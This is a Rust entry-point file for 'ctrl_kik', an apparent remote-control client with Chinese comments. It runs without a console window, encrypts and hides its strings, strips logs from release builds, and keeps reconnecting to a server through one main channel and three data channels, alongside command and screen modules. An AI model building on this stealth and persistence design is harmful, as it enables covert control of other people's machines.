#![windows_subsystem = "windows"] // 后台子系统：双击运行不创建控制台窗口，标准输出也不会显示。

//! ctrl_kik 的进程入口和断线重连外循环。
//!
//! 每轮先建立一条 Noise Kik 主连接，认证成功后并行建立三条 KikData 连接；主连接退出即取消尚在握手的
//! 数据连接、清空本轮状态并重试。命令执行和帧解析分别位于 `cmd_runner` 与 `read_handle`。

use crate::context::Context;
use common::config::{Config, Id, SecurityConfig};
use common::generated::encrypted_strings::*;
use common::hidden;
use common::host::get_host;
use std::path::Path;
use std::time::{Duration, Instant};
use tokio::fs::{File, OpenOptions};
use tokio::task::JoinSet;
use tokio::time;

// 开发和测试构建默认保留诊断日志；protected 发布同时关闭 debug_assertions 和
// development-logging feature，宏会在编译早期展开为空，不把格式串、模块路径或日志框架带入产物。
#[cfg(all(debug_assertions, feature = "development-logging"))]
macro_rules! dev_debug {
    ($($arg:tt)*) => {
        log::debug!($($arg)*)
    };
}

#[cfg(not(all(debug_assertions, feature = "development-logging")))]
macro_rules! dev_debug {
    // 返回显式的单元值，使宏既能作为普通语句，也能安全地放在 match 分支等表达式位置。
    // 参数 token 不会进入展开结果，因此发布产物仍不会包含日志格式串。
    ($($arg:tt)*) => {{
        ()
    }};
}

mod cmd_runner;
mod cmd_util;
mod context;
mod kik_conn;
mod kik_data_conn;
mod read_handle;
mod screen;

/// 每个主会话维持三条独立数据连接，既可并行发送分片，也允许单链路故障时继续工作。
const DESIRED_DATA_CONNECTIONS: usize = 3;
const DATA_RECONNECT_MAX_BACKOFF: Duration = Duration::from_secs(30);
const DATA_CONNECTION_STABLE_AFTER: Duration = Duration::from_secs(30);

#[tokio::test]
async fn test() {
    use common::file_util;
    let test_dir = Path::new(env!("CARGO_MANIFEST_DIR"))
        .join("..")
        .join("target")
        .join("ctrl_kik_get_dir_size_test");

    // 测试数据必须留在仓库 target 目录内，避免依赖开发机私有盘符。
    let _ = tokio::fs::remove_dir_all(&test_dir).await;
    tokio::fs::create_dir_all(test_dir.join("nested"))
        .await
        .unwrap();
    tokio::fs::write(test_dir.join("a.bin"), [1_u8, 2, 3])
        .await
        .unwrap();
    tokio::fs::write(test_dir.join("nested").join("b.bin"), [4_u8, 5])
        .await
        .unwrap();

    assert_eq!(file_util::get_dir_size(&test_dir).await.unwrap(), 5);
}

fn main() {
    init_development_logging();

    // 显式固定运行时线程配置，避免部署环境意外改变线程数、线程名或栈大小。
    // worker 数仍按机器并行度计算，与 Tokio 多线程运行时的默认性能策略一致。
    let worker_threads =
        std::thread::available_parallelism().map_or(1, std::num::NonZeroUsize::get);
    let runtime = match tokio::runtime::Builder::new_multi_thread()
        .worker_threads(worker_threads)
        .thread_name(hidden!("worker"))
        .thread_stack_size(2 * 1024 * 1024)
        .enable_all()
        .build()
    {
        Ok(runtime) => runtime,
        Err(_error) => {
            dev_debug!("初始化异步运行时失败: {}", _error);
            std::process::exit(1);
        }
    };
    if let Err(_error) = runtime.block_on(run_client()) {
        dev_debug!("客户端运行失败: {}", _error);
        std::process::exit(1);
    }
}

async fn run_client() -> anyhow::Result<()> {
    // 文件句柄存活期间持有独占锁；进程退出时操作系统自动释放，不需要删除锁文件来“解锁”。
    let _single_lock = single(LOCK_FILE_PATH()).await?;
    let context = Context::new();
    let config = Config {
        id: Id::anonymous(),
        server_host: get_host(),
        server_port: PORT(),
        read_timeout: Duration::from_secs(45),
        write_timeout: Duration::from_secs(45),
        security: SecurityConfig::kik(),
    };

    loop {
        // 短间隔尝试三次主连接；连续失败后进入较长退避，避免服务端离线时形成连接风暴。
        for _ in 0..3 {
            match kik_conn::kik_conn(context.clone(), &config).await {
                Ok(h) => {
                    // 主连接已经取得 Kik ID。每个监督槽位负责“一条连接的整个生命周期”：连接退出后
                    // 原槽位会指数退避并补建，而不是像旧实现那样只在进程首次上线时尝试一次。
                    let Some(expected_kik) = context.get_kik().await else {
                        h.abort();
                        continue;
                    };
                    let mut data_supervisors = JoinSet::new();
                    for slot in 0..DESIRED_DATA_CONNECTIONS {
                        data_supervisors.spawn(supervise_data_connection_slot(
                            context.clone(),
                            config.clone(),
                            expected_kik.clone(),
                            slot,
                        ));
                    }
                    let _ = h.await;
                    // 先关闭连接并撤销“当前会话”身份，再取消监督器。即使某个旧握手恰好完成，
                    // `insert_data_conn_for` 的 Arc 身份校验也会拒绝它进入下一轮连接池。
                    context.clear().await;
                    context.set_kik(None).await;
                    data_supervisors.abort_all();
                    while data_supervisors.join_next().await.is_some() {}
                }
                Err(_error) => {
                    dev_debug!("命令连接失败: {}", _error);
                    time::sleep(Duration::from_secs(2)).await;
                }
            }
        }

        time::sleep(Duration::from_secs(20)).await;
    }
}

/// 维护一个 KikData 连接槽位，直到所属主连接结束。
///
/// 三个槽位彼此独立，某条链路断开不会取消仍健康的链路。短连接连续失败时使用指数退避并按槽位
/// 错开少量时间，避免服务端恢复瞬间三个连接同步形成重连尖峰；稳定运行 30 秒后重新从最短退避开始。
async fn supervise_data_connection_slot(
    context: Context,
    config: Config,
    expected_kik: context::Kik,
    slot: usize,
) {
    let mut backoff = Duration::from_secs(1);
    loop {
        if !context.is_current_kik(&expected_kik).await {
            return;
        }

        let connected_at = Instant::now();
        match kik_data_conn::kik_data_conn(context.clone(), expected_kik.clone(), &config).await {
            Ok(connection_task) => {
                let _ = connection_task.await;
                if connected_at.elapsed() >= DATA_CONNECTION_STABLE_AFTER {
                    backoff = Duration::from_secs(1);
                }
            }
            Err(_error) => dev_debug!("数据连接槽位 {} 建立失败: {}", slot, _error),
        }

        if !context.is_current_kik(&expected_kik).await {
            return;
        }
        let stagger = Duration::from_millis((slot as u64) * 250);
        time::sleep(backoff + stagger).await;
        backoff = backoff
            .checked_mul(2)
            .unwrap_or(DATA_RECONNECT_MAX_BACKOFF)
            .min(DATA_RECONNECT_MAX_BACKOFF);
    }
}

pub async fn single<P: AsRef<Path>>(lock_path: P) -> anyhow::Result<File> {
    use fs4::tokio::AsyncFileExt;
    if let Some(parent) = lock_path
        .as_ref()
        .parent()
        .filter(|path| !path.as_os_str().is_empty())
    {
        tokio::fs::create_dir_all(parent).await?;
    }
    let lock_file = OpenOptions::new()
        .read(true)
        .write(true)
        .create(true)
        .truncate(false)
        .open(lock_path)
        .await?;
    let mut last_error = None;
    for _ in 0..3 {
        match lock_file.try_lock_exclusive() {
            Ok(_) => return Ok(lock_file),
            Err(error) => last_error = Some(error),
        }
        time::sleep(Duration::from_secs(1)).await;
    }
    Err(anyhow::Error::msg(hidden!(
        "已有客户端实例运行或无法取得运行锁: ",
        last_error
            .map(|error| error.to_string())
            .unwrap_or_else(|| hidden!("未知错误"))
    )))
}

#[cfg(all(debug_assertions, feature = "development-logging"))]
fn init_development_logging() {
    use chrono::Local;
    use std::env;
    use std::io::Write;

    if "DEBUG".eq(env::var("LOG").unwrap_or_default().as_str()) {
        env_logger::Builder::new()
            .format(|buf, record| {
                writeln!(
                    buf,
                    "{} [{}] - {}",
                    Local::now().format("%Y-%m-%d %H:%M:%S%.3f"),
                    record.level(),
                    record.args()
                )
            })
            .parse_env("LOG")
            .init();
    }
}

#[cfg(not(all(debug_assertions, feature = "development-logging")))]
#[inline(always)]
fn init_development_logging() {}
